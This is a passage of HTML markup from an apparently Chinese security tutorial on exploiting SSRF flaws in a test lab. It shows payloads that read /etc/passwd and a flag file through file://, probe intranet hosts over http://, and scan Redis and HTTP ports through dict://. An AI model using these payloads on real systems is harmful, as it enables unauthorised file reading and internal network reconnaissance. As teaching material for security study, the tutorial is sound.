204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">file</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">///etc/passwd</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">file</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">///var/www/html/flag.php</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4352112676056338" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/9_1N2TIbiaaeO4DicNYWKZu5gktTJlew.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gmxeCSvV6LfdBIXRhuCG20Kuyyu1N2TIbiaaeO4DicNYWKZu5gktTJlew/640?wx_fmt=png'" data-type="png" data-w="1420" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.2478723404255319" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/10_1klG1QTiaeFkoS2Zxia8sX9I8jGcdA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gZtiavEAWiaQZ52UEbaCU5SqyU3PA1klG1QTiaeFkoS2Zxia8sX9I8jGcdA/640?wx_fmt=png'" data-type="png" data-w="940" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">探测内网主机存活（http/s协议）</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">域网IP地址范围分三类，以下IP段为内网IP段：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">C</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">类：</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">-</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">255.255</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><br  /></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">B</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">类：</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">172.16</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">-</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">172.31</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">255.255</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><br  /></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">A</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">类：</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">10.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">-</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">10.255</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">255.255</span></code></span></span></p></li></ol></pre></blockquote><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试环境如下：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6167979002624672" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/11_QB5GB6ynFTOibhgnxvqhib6nJBW4Lg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png'" data-type="png" data-w="762" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">http</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.1</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">http</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.6</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">http</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.25</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">......</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.775811209439528" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/12_ggfKFlCrgkSlrAkSv4FrLiaR1mc2mw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gKj5nAMiau5qjjSjGlckEGlUdUWggfKFlCrgkSlrAkSv4FrLiaR1mc2mw/640?wx_fmt=png'" data-type="png" data-w="1017" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.775811209439528" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/13_xaJRxFeBZfzF8RAjShy0lYlVa5B7Pw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtn76kHWHY9yJ0IhBSiczKjeHWxaJRxFeBZfzF8RAjShy0lYlVa5B7Pw/640?wx_fmt=png'" data-type="png" data-w="1017" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.775811209439528" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/14_Tvx4UueyAQp9TAZmV275WkXBF64L0g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gAa39hPAVQUqgBeMVRcQE9trHTvx4UueyAQp9TAZmV275WkXBF64L0g/640?wx_fmt=png'" data-type="png" data-w="1017" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">扫描内网端口（http/s和dict协议）</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">同样是上面那个测试环境：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6167979002624672" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/15_QB5GB6ynFTOibhgnxvqhib6nJBW4Lg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png'" data-type="png" data-w="762" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">dict</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.131</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">6379</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">info   </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">//</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> redis</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">dict</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.131</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">80</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">info     </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">//</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> http</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 